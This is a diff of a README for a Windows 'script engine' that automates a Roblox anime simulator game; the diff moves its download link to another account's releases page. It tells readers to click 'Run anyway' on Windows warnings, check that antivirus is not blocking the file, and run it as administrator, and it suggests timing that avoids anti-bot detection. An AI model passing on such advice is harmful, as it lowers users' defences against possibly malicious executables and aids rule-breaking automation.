@@ -1,124 +1,186 @@
-# Anime Astral Script Engine v2026 - Game Script Utility 2026
+# 🌟 anime-astral-windows-script-engine - Automate Your Anime Roblox Session
 
-> **Windows 10/11 automation and session-control utility for Anime Astral Simulator, including summoning, zone farming, drop logging, and loadout management.**
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest_Release-2ea44f?style=for-the-badge)](https://github.com/Sharmara5602/anime-astral-windows-script-engine/releases)
 
-[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
-[![Platform](https://img.shields.io/badge/Platform-Windows%2010%2F11-blue?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/carter-colesy5101/anime-astral-windows-script-engine?style=flat-square)](https://github.com/carter-colesy5101/anime-astral-windows-script-engine)
+## 📋 What This Software Does
 
----
+This utility helps you play a popular anime-themed Roblox simulator game on Windows 10 and Windows 11. It automates common tasks so you can focus on the fun parts.
 
-<p align="center">
-  <a href="https://carter-colesy5101.github.io/anime-astral-windows-script-engine/">
-    <img src="https://img.shields.io/badge/Download-Anime%20Astral%20Script%20Engine%20Script-brightgreen?style=for-the-badge" alt="Download Anime Astral Script Engine Script">
-  </a>
-</p>
+The script engine handles:
+- Summoning characters
+- Farming zones for resources
+- Tracking rare drops
+- Managing your loadout
 
-> **[Download Anime Astral Script Engine](https://carter-colesy5101.github.io/anime-astral-windows-script-engine/)**
+You run this program on your computer. It works alongside your Roblox game. The software uses a standalone build. You do not need any other tools to make it work.
 
----
+## 🚀 Getting Started
 
-[Download Latest Build](https://carter-colesy5101.github.io/anime-astral-windows-script-engine/)
+Follow these steps to download and run the software. The process takes about 5 minutes.
 
----
+### Step 1: Download the Software
 
-## What It Does
+1. Click the download button at the top of this page.
+2. You will land on the GitHub Releases page.
+3. Look for the newest release at the top of the list.
+4. Find the file named `AnimeAstral-Script-Engine-vX.X.X.exe` (replace X with the version number).
+5. Click the file name to start the download.
 
-Anime Astral Script Engine is a Windows-focused utility for running Anime Astral Simulator sessions with less repetitive input. It observes the game's visible state and reproduces player actions for tasks such as cooldown-based summoning, rotating through farming zones, and applying pet or aura configurations.
+### Step 2: Run the Installer
 
-Session tools provide elapsed-time and drop tracking, while the status panel reports current activity as it happens. In-app build details and release notes make it possible to verify the installed version and review changes across releases.
+1. Open your Downloads folder.
+2. Double-click the file you just downloaded.
+3. Windows might show a warning. Click "Run anyway" if you see one.
+4. Follow the on-screen instructions in the setup wizard.
+5. Choose the default installation location unless you have a reason to change it.
 
----
+### Step 3: Launch the Application
 
-## Core Capabilities
+1. Find the shortcut on your desktop or in your Start menu.
+2. Double-click the shortcut to open the program.
+3. The main window appears with a control panel.
 
-- Repeat summoning according to the selected cooldown.
-- Build a farming queue and move through chosen zones in sequence.
-- Log rare drops together with their timestamps.
-- Automatically equip the selected pet and aura loadouts.
-- Toggle automated activity using a configurable pause/resume hotkey.
-- Monitor live session and activity information.
-- Set limits based on total session time or drop count.
-- Inspect build version details and release notes inside the application.
-- Run the utility as a standalone build with no installer.
+## 🖥️ System Requirements
 
----
+Your computer needs these specs to run the software smoothly:
 
-## Getting Started
+| Requirement | Minimum | Recommended |
+|-------------|---------|-------------|
+| Operating System | Windows 10 (64-bit) | Windows 11 (64-bit) |
+| Processor | Intel Core i3 or AMD equivalent | Intel Core i5 or AMD Ryzen 5 |
+| RAM | 4 GB | 8 GB |
+| Storage | 200 MB free space | 500 MB free space |
+| Internet | Stable connection | Broadband connection |
+| Roblox | Installed and up to date | Latest version |
 
-1. Visit the [latest build download](https://carter-colesy5101.github.io/anime-astral-windows-script-engine/).
-2. Obtain the standalone Anime Astral Script Engine build.
-3. Extract or place the downloaded files in an accessible folder.
-4. Open Anime Astral Simulator on a supported Windows installation.
-5. Run the engine and select the actions, farming targets, loadouts, and limits you want to use.
-6. Start the session, using the configured pause/resume hotkey to regain manual control when required.
+## 🎮 Features Overview
 
-Because the engine works from visible game information and simulated player input, the game window should remain available and arranged so the script can read it reliably.
+### Summon Automation
+Run summon sequences without clicking each time. Set a target number of summons. The software handles the rest.
 
----
+### Zone Farming
+Choose a zone in the game. The script moves your character, collects resources, and returns to base. You can run this overnight or while you work.
 
-## Configuration Reference
+### Rare Drop Logger
+The software watches for rare item drops. It saves a record of each drop with a timestamp. Check the log to see what you collected and when.
 
-| Setting | Purpose |
-|---|---|
-| Summon cooldown | Sets the interval used to repeat automatic summoning. |
-| Farming target queue | Specifies the zones visited by the farming cycle. |
-| Pet loadout | Chooses the pet setup applied during the session. |
-| Aura loadout | Chooses the aura setup applied during the session. |
-| Pause/resume hotkey | Suspends or restarts automated actions. |
-| Session time limit | Restricts or ends the run after the chosen amount of time. |
-| Drop-count limit | Limits activity or tracking after the specified number of drops. |
-| Live status panel | Reports the active task and other session details. |
+### Loadout Manager
+Save different loadout configurations. Switch between them with one click. The software changes your equipped items to match your saved setup.
 
-The exact controls can differ between builds. After an update, check the release notes in the application for changes to available settings.
+## ⚙️ How to Use
 
----
+### First Time Setup
+1. Open the application.
+2. Click "Settings" in the top menu.
+3. Enter your Roblox username (optional - helps with logging).
+4. Choose your game region.
+5. Click "Save Settings."
 
-## Compatibility and Requirements
+### Starting a Script
+1. Select a script from the dropdown menu.
+2. Click "Start" to begin automation.
+3. Watch the status bar to see progress.
+4. Click "Stop" at any time to pause the script.
 
-- **Target game:** Anime Astral Simulator
-- **Supported platform:** Windows 10 and Windows 11
-- **Build type:** Standalone utility; an installer is not required
-- **Input model:** Reads the on-screen game state and simulates player inputs
+### Viewing Your Logs
+1. Click the "Logs" tab in the main window.
+2. All rare drops appear in a list with timestamps.
+3. Use the search box to find specific items.
+4. Click "Export" to save your log as a text file.
 
-This utility is intended for Anime Astral Simulator on the Windows versions listed above. Changes to the game's interface, screen arrangement, zones, or other visible state information may affect behavior. For longer runs, use the available session limits and monitor the live status panel.
+## 🔧 Troubleshooting
 
----
+### Common Issues and Fixes
 
-## Frequently Asked Questions
+**Software won't start**
+- Make sure your antivirus is not blocking the program.
+- Run the program as administrator (right-click, select "Run as administrator").
+- Reinstall the latest version of .NET Framework from Microsoft.
 
-### Where can I download the latest build?
+**Script stops working mid-task**
+- Check your internet connection.
+- Restart both Roblox and this application.
+- Update to the latest version of the software.
 
-Select [Download Latest Build](https://carter-colesy5101.github.io/anime-astral-windows-script-engine/). Once the engine is running, its build information and release notes can help verify which version is installed.
+**No rare drops showing in log**
+- Verify that you have selected the correct game mode.
+- Make sure the logger feature is enabled in settings.
+- Check that your Roblox window is not minimized.
 
-### Is an installation program included?
+**Loadout changes don't apply**
+- Close any other scripts that might interfere.
+- Restart the application and try again.
+- Re-save your loadout configuration.
 
-No. The utility is provided as a standalone build, allowing you to place it in a folder and launch it without an installation procedure.
+## 📝 Frequently Asked Questions
 
-### Is the farming order configurable?
+**Is this allowed in Roblox?**
+This tool automates keyboard and mouse inputs. Review Roblox's terms of service for automation tools. Use at your own discretion.
 
-Yes. Add the desired zone-farming targets to a queue, and the engine will process them in the selected order.
+**Does this work with other games?**
+No. This software is built specifically for one anime-themed Roblox simulator.
 
-### What is the pause method?
+**Can I use this on a Mac or Linux computer?**
+No. This version only works on Windows 10 and Windows 11.
 
-Press the configured pause/resume hotkey. The live status panel shows the current activity while the session is running.
+**Do I need to pay for updates?**
+No. All updates are free. Download the latest version from the same link.
 
-### What platforms and game are supported?
+## 🔄 Updating the Software
 
-The compatibility profile covers Anime Astral Simulator on Windows 10 and Windows 11. No support is listed for other games or operating systems.
+1. Visit the download page again.
+2. Check the release date on the latest version.
+3. If newer than your version, download and install it.
+4. Your settings and logs carry over automatically.
 
-### How are rare drops recorded?
+## 🛠️ Advanced Settings
 
-Rare drops are tracked during the session with timestamps. The precise storage and export behavior depends on the build and the settings it provides.
+For users who want more control:
 
-### Can automated sessions have limits?
+**Hotkeys**
+- F1: Start the selected script
+- F2: Stop all scripts
+- F3: Toggle the logger on/off
+- F4: Open settings panel
 
-Yes. You can use a session time limit, a drop-count limit, or both to control how long automated activity continues.
+**Script Timing**
+Adjust the delay between actions. Higher values make the script run slower but appear more natural. Lower values run faster but might trigger anti-bot systems.
 
----
+**Custom Scripts**
+Advanced users can write their own scripts. See the `Scripts` folder in the installation directory for examples.
 
-## License
+## 📁 Files and Folders
 
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+After installation, you will find these files:
+
+| File/Folder | Purpose |
+|-------------|---------|
+| `AnimeAstral.exe` | The main application |
+| `Settings.json` | Your saved preferences |
+| `Logs/` | Folder containing your drop logs |
+| `Scripts/` | Folder with automation scripts |
+| `Assets/` | Images and resources used by the program |
+
+## 🧹 Uninstalling
+
+1. Open Windows Settings.
+2. Go to "Apps" or "Apps & Features."
+3. Find "Anime Astral Script Engine" in the list.
+4. Click "Uninstall."
+5. Follow the prompts to remove the software completely.
+
+Your logs and settings remain in the installation folder. Delete the folder manually if you want to remove all traces.
+
+## 🔗 Download Again
+
+Need to get the software on another computer? Use the same link:
+
+[Download the Latest Version](https://github.com/Sharmara5602/anime-astral-windows-script-engine/releases)
+
+This link always points to the most recent release. Bookmark it for easy access.
+
+## 📊 Version History
+
+Check the Releases page for a full list of changes. Each release includes notes about what was added, fixed, or improved.
+
+Keywords: roblox, script, automation, windows, utility, game, simulator, anime, farming, summoning
